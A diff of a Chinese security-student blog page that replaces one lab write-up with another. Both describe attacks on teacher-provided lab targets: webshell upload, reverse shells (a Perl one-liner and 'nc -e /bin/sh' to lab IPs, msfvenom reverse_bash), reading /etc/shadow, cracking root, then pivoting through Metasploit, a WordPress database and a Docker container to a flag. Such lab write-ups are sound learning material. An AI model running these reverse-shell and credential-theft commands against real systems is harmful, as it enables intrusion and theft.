@@ -5,9 +5,9 @@
 
 <head><meta name="generator" content="Hexo 3.8.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="对网站后台的一次大马攻击并反弹提权, pgg,信息安全，小白教程，情感博主">
-    <meta name="description" content="对网站后台的一次大马攻击并反弹提权前言：   经常使用一句话木马，总感觉没有什么存在感，今天第一次使用大马，很是有点激动的
-所需工具： 测试网站，是老师帮我们搭建的，小伙伴们千万不要用别人的网站做实验哦大马，大马是在https://gith">
+    <meta name="keywords" content="入侵提权内网渗透(完整版), pgg,信息安全，小白教程，情感博主">
+    <meta name="description" content="入侵提权内网渗透(完整版)​              #注：这次靶机测试，我搞了两天，被靶机秀成了麻瓜，接下来我带领大家领略入侵的快感，当然，你们会看的头皮发麻  哈哈
+​         亲爱的老师给了我们一个ip  192.168.0">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -15,7 +15,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>对网站后台的一次大马攻击并反弹提权 | pgg学长</title>
+    <title>入侵提权内网渗透(完整版) | pgg学长</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -57,13 +57,13 @@
 
 
 
-<div class="bg-cover post-cover" style="background-image: url('/medias/featureimages/22.jpg')">
+<div class="bg-cover post-cover" style="background-image: url('/medias/featureimages/6.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        对网站后台的一次大马攻击并反弹提权
+                        入侵提权内网渗透(完整版)
                     </div>
                 </div>
             </div>
@@ -85,74 +85,93 @@
                 
 
                 <span class="post-date">
-                    <i class="fa fa-clock-o fa-fw"></i>2019-04-22
+                    <i class="fa fa-clock-o fa-fw"></i>2019-04-28
                 </span>
             </div>
         </div>
         <hr>
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="对网站后台的一次大马攻击并反弹提权"><a href="#对网站后台的一次大马攻击并反弹提权" class="headerlink" title="对网站后台的一次大马攻击并反弹提权"></a>对网站后台的一次大马攻击并反弹提权</h1><p><strong>前言：</strong>   <em>经常使用一句话木马，总感觉没有什么存在感，今天第一次使用大马，很是有点激动的</em></p>
-<p><u>所需工具： 测试网站，是老师帮我们搭建的，小伙伴们千万不要用别人的网站做实验哦大马，大马是在<a href="https://github.com/" target="_blank" rel="noopener">https://github.com</a>上找到的，大家要仔细分析，千万不要被黑吃黑</u></p>
-<ol>
-<li><p><em>实验开始，老师给了一段ip  192.168.0.127拿到ip  我先用nmap扫描看看</em></p>
-<p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/1.png"></p>
-</li>
-</ol>
-<p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/2.png"></p>
-<ol start="2">
-<li><p><em>它告诉我们 博客正在搭建  既然有的话  那我就得扫一下它的目录了</em></p>
-<p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/3.png"></p>
-<ol start="3">
-<li><em>不得了 .git源码泄露了   还爆出了admin.php等目录，我们先把他源码爆出了，使用 GitHack  嗯，你们可以去<a href="https://github.com/" target="_blank" rel="noopener">https://github.com</a>下载它   开始爆了</em></li>
-</ol>
-</li>
-</ol>
-<p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/4.png"></p>
-<p>爆出来了我们去看一看</p>
-<p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/5.png"></p>
-<ol start="4">
-<li><p><em>直接就出来了账号密码  我们去访问 admin.php  使用这个账号密码  看能不能登录</em></p>
-<p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/6.png"></p>
-<p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/7.png"></p>
-<ol start="5">
-<li><p><em>现在上传大马，看看能不能连接</em></p>
-<p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/8.png"></p>
-<p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/9.png"></p>
-</li>
-</ol>
-</li>
-</ol>
-<ol start="6">
-<li><p>*现在我们开始反弹提权  木马shell打命令</p>
-<p>perl -e’use Socket;$i=”192.168.0.135”;$p=1235;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”&gt;&amp;S”);open(STDOUT,”&gt;&amp;S”);open(STDERR,”&gt;&amp;S”);exec(“/bin/sh -i”);};’</p>
-<p>kail 命令打 nc –lvp 1235*</p>
-</li>
-</ol>
-<p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/10.png"></p>
-<p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/11.png"></p>
-<p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/12.png"></p>
-<p>我们cd ..  看看根目录</p>
-<p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/13.png"></p>
-<ol start="7">
-<li><p><em>Home 是储存账户信息的 我们进去看看</em></p>
-<p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/14.png"></p>
-</li>
-<li><p><em>我们用exp打这个文件   开一个kali界面   使用命令：msfvenom -p<br>  cmd/unix/reverse_bash LHOST=192.168.0.153 LPORT=1143</em></p>
-<p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/15.png"></p>
-</li>
-<li><p><em>现在我们把它加到.sh文件中  ，这里我们就用kail的shell加</em></p>
-<p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/16.png"></p>
-</li>
-<li><p><em>然后我们kail用msf进入监听模块，去监听他   监听exp =  exploit/multi/handler  Payload是我们生成时候用的payload</em></p>
-<p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/17.png"></p>
-<p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/18.png"></p>
-<p><img src="http://kan.027cgb.com/613977/新建文件夹(1)/19.png"></p>
-</li>
-</ol>
-<p><del>一次提权就结束了 实际操作还是需要多多练习呢</del></p>
-<p>#注：  <strong>生活就是冲着未来，不要总沉浸在悲伤里</strong></p>
-
+                <h1 id="入侵提权内网渗透-完整版"><a href="#入侵提权内网渗透-完整版" class="headerlink" title="入侵提权内网渗透(完整版)"></a>入侵提权内网渗透(完整版)</h1><p>​              #<u>注：这次靶机测试，我搞了两天，被靶机秀成了麻瓜，接下来我带领大家领略入侵的快感，当然，你们会看的头皮发麻  哈哈</u></p>
+<p>​         <strong>亲爱的老师给了我们一个ip  192.168.0.178     提示：上传的文件会在5分钟内自动删除，上传的文件名会被md5加密并随机加上1—100内的md5  重命名，当然，看源码也看的出来</strong></p>
+<p><img src="http://kan.027cgb.com/613977/内网渗透/1.png"></p>
+<ul>
+<li>老规矩，先扫描一下网站*</li>
+</ul>
+<p><img src="http://kan.027cgb.com/613977/内网渗透/2.png"></p>
+<ul>
+<li>先登录robots.txt*</li>
+</ul>
+<p><img src="http://kan.027cgb.com/613977/内网渗透/3.png"></p>
+<ul>
+<li></li>
+<li></li>
+<li>我们登录试试这个提示网点*</li>
+</ul>
+<p><img src="http://kan.027cgb.com/613977/内网渗透/4.png"></p>
+<ul>
+<li>是一个上传页面，我们上传一个马上去，  因为我的马是php  所以我在代码前面加一个图片格式的代码*</li>
+</ul>
+<p><img src="http://kan.027cgb.com/613977/内网渗透/5.png"></p>
+<ul>
+<li>就先不上传了   先写一个python的脚本    好方便等会爆破目录*</li>
+</ul>
+<p><img src="http://kan.027cgb.com/613977/内网渗透/6.png"></p>
+<ul>
+<li>把脚本跑出的内容放在txt里面这些就不讲了  先上传木马*</li>
+</ul>
+<p><img src="http://kan.027cgb.com/613977/内网渗透/7.png"></p>
+<ul>
+<li></li>
+<li></li>
+<li></li>
+<li>出现了  旁边的字母  就说明已经上传成功了，抓紧时间  只有半个小时  抓包显示文件上传到   uploads/?   目录    那我们就随便在/后面输入一个文件，然后抓包爆破*</li>
+</ul>
+<p><img src="http://kan.027cgb.com/613977/内网渗透/8.png"></p>
+<p><img src="http://kan.027cgb.com/613977/内网渗透/9.png"></p>
+<p><img src="http://kan.027cgb.com/613977/内网渗透/10.png"></p>
+<p><img src="http://kan.027cgb.com/613977/内网渗透/11.png"></p>
+<p><img src="http://kan.027cgb.com/613977/内网渗透/12.png"></p>
+<p><em>爆破出来后直接去浏览器（不想开车）  nc –e<br>/bin/sh 192.168.0.126 4433</em></p>
+<p><img src="http://kan.027cgb.com/613977/内网渗透/13.png"></p>
+<p>​      <em>用反弹来拿shell，老规矩啊      nc –lvp 4433</em></p>
+<p><img src="http://kan.027cgb.com/613977/内网渗透/14.png"></p>
+<p><img src="http://kan.027cgb.com/613977/内网渗透/16.png"></p>
+<p>​     </p>
+<p>​             <em>现在就是已经连上来了  我们先提个权，避免5分钟后断掉连接      Python –c ‘import pty;pty.spawn(“/bin/sh”)’</em></p>
+<p><img src="http://kan.027cgb.com/613977/内网渗透/17.png"></p>
+<p>​      </p>
+<p>​        <em>使用了这个命令后 就稍微提了权   上面图片有过程  使用命令  Tail –n100 /etc/shadow</em></p>
+<p><img src="http://kan.027cgb.com/613977/内网渗透/18.png"></p>
+<p>​    </p>
+<p>​        <em>已经爆出来了root密码  但是它被加密了  我们复制这串密文，用kail自带的解密去破解</em></p>
+<p><img src="http://kan.027cgb.com/613977/内网渗透/19.png"></p>
+<p><img src="http://kan.027cgb.com/613977/内网渗透/20.png"></p>
+<p>​       <em>解密后<br>​                  发现密码是  jojn  我们直接  su root 登录</em></p>
+<p><img src="http://kan.027cgb.com/613977/内网渗透/21.png"></p>
+<p>​    </p>
+<p>   <em>哈哈<br>​             我们现在是root权限<br>​            真鸡儿猛,但并没有什么用  我们到处看看，发现了有个wp-config.php<br>​            文件  一般都是配置文件 查看内容发现 是连接数据库的配置文件。账户密码皆为wordpress 。。emm好像           也用不上，数据库连接需要内网</em></p>
+<p><img src="http://kan.027cgb.com/613977/内网渗透/22.png"></p>
+<p><img src="http://kan.027cgb.com/613977/内网渗透/23.png"></p>
+<p>​          <em>我们使用msf生成监听 获得内网的ip地址</em></p>
+<p><img src="http://kan.027cgb.com/613977/内网渗透/24.png"></p>
+<p><img src="http://kan.027cgb.com/613977/内网渗透/25.png"></p>
+<p>​       <em>然后利用刚刚拿到的shell  扫描他的路由</em></p>
+<p><img src="http://kan.027cgb.com/613977/内网渗透/26.png"></p>
+<p>​         <em>进入扫描内网模块</em></p>
+<p><img src="http://kan.027cgb.com/613977/内网渗透/27.png"></p>
+<p><img src="http://kan.027cgb.com/613977/内网渗透/28.png"></p>
+<p>​         发现有一个ip 开着3306 端口 数据库的端口 数据库连接：mysql -u wordpress -pwordpress -h x.x.x.x 查数据库-&gt;show databases；使用数据库：use wordpress； 查看表：-&gt; show tables ; 查数据;-&gt; select * from XXXXX 获得账户密码， 密码解密</p>
+<p><img src="http://kan.027cgb.com/613977/内网渗透/29.png"></p>
+<p><img src="http://kan.027cgb.com/613977/内网渗透/30.png"></p>
+<p><img src="http://kan.027cgb.com/613977/内网渗透/31.png"></p>
+<p><em>ssh连接   ssh 账户名@ip</em></p>
+<p><img src="http://kan.027cgb.com/613977/内网渗透/32.png"></p>
+<p><em>docker ps 查看进程  进入 容器 docker attach id</em></p>
+<p><img src="http://kan.027cgb.com/613977/内网渗透/33.png"></p>
+<p><em>root@252fa8cb1646:/# root -i -t ubuntu /bin/bash   ls 进入root/root ls cat flag   得到    flag</em></p>
+<p><img src="http://kan.027cgb.com/613977/内网渗透/34.png"></p>
+<h1 id="这次实验，用了两天的时间才做出了的，其实并没有我写的那么简单，是经过一次又一次的失败，重头开始而完成的，出手要狠，姿势要骚。"><a href="#这次实验，用了两天的时间才做出了的，其实并没有我写的那么简单，是经过一次又一次的失败，重头开始而完成的，出手要狠，姿势要骚。" class="headerlink" title="#   这次实验，用了两天的时间才做出了的，其实并没有我写的那么简单，是经过一次又一次的失败，重头开始而完成的，出手要狠，姿势要骚。"></a><u>#   这次实验，用了两天的时间才做出了的，其实并没有我写的那么简单，是经过一次又一次的失败，重头开始而完成的，出手要狠，姿势要骚。</u></h1>
             </div>
             <hr>
 
@@ -282,7 +301,7 @@
                     <span class="reprint-tip">转载请注明: </span>
                     <a href="https://pgg666.org" class="b-link-green">pgg学长</a>
                     <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
-                    <a href="/2019/04/22/对网站后台的一次大马攻击并反弹提权/" class="b-link-green">对网站后台的一次大马攻击并反弹提权</a>
+                    <a href="/2019/04/28/入侵提权内网渗透/" class="b-link-green">入侵提权内网渗透(完整版)</a>
                 </p>
             </div>
         </div>
@@ -304,7 +323,7 @@
     <div class="row article-row">
         
         <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge left-badge text-color">上一篇</div>
+            <div class="article-badge left-badge text-color">本篇</div>
             <div class="card">
                 <a href="/2019/04/28/入侵提权内网渗透/">
                     <div class="card-image">
@@ -319,9 +338,9 @@
                     <div class="summary">入侵提权内网渗透(完整版)​              #注：这次靶机测试，我搞了两天，被靶机秀成了麻瓜，接下来我带领大家领略入侵的快感，当然，你们会看的头皮发麻  哈哈
 ​         亲爱的老师给了我们一个ip  192.168.0</div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2019-04-28
-                        </span>
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-04-28
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-user fa-fw"></i>
@@ -330,6 +349,7 @@
                         </span>
                     </div>
                 </div>
+
                 
             </div>
         </div>
@@ -338,23 +358,21 @@
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge right-badge text-color">下一篇</div>
             <div class="card">
-                <a href="/2019/04/14/域渗透神器Empire的一次简单渗透/">
+                <a href="/2019/04/22/对网站后台的一次大马攻击并反弹提权/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/19.jpg" class="responsive-img" alt="域渗透神器Empire的一次简单渗透">
+                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="对网站后台的一次大马攻击并反弹提权">
                         
-                        <span class="card-title">域渗透神器Empire的一次简单渗透</span>
+                        <span class="card-title">对网站后台的一次大马攻击并反弹提权</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
-                    <div class="summary">域渗透神器Empire的一次简单渗透​          需要工具:win7系统    kail系统
-​     前言：在日常的学习中，总是会把学过的知识遗忘，那我们就把它写成博客，供自己与他们一起学习
-
-​      Empire的安装:</div>
+                    <div class="summary">对网站后台的一次大马攻击并反弹提权前言：   经常使用一句话木马，总感觉没有什么存在感，今天第一次使用大马，很是有点激动的
+所需工具： 测试网站，是老师帮我们搭建的，小伙伴们千万不要用别人的网站做实验哦大马，大马是在https://gith</div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-04-14
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-04-22
                             </span>
                         <span class="publish-author">
                             
